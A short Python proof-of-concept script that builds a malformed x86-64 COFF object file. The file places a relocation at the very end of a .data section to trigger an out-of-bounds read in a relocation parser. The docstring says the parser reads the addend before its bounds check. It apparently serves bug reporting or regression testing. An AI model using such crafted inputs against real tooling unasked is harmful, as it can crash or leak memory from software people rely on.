#!/usr/bin/env python3
"""Reloc at offset == SizeOfRawData: coff_reloc_type() reads the addend out of
the section contents BEFORE the 'overruns the section' bounds check."""
import sys
from gen_coff import *
size = int(sys.argv[1]) if len(sys.argv) > 1 else 64
rtype = int(sys.argv[2]) if len(sys.argv) > 2 else 1   # 1 = ADDR64 (reads 8 bytes)
o = build(0x8664,
          sections=[sec(b'.data', DATA, data=b'A'*size, relocs=[(size, 0, rtype)])],
          symbols=[sym(b'_x', 0, 1, 2)])
open(sys.argv[3] if len(sys.argv) > 3 else 'oob.o', 'wb').write(o)
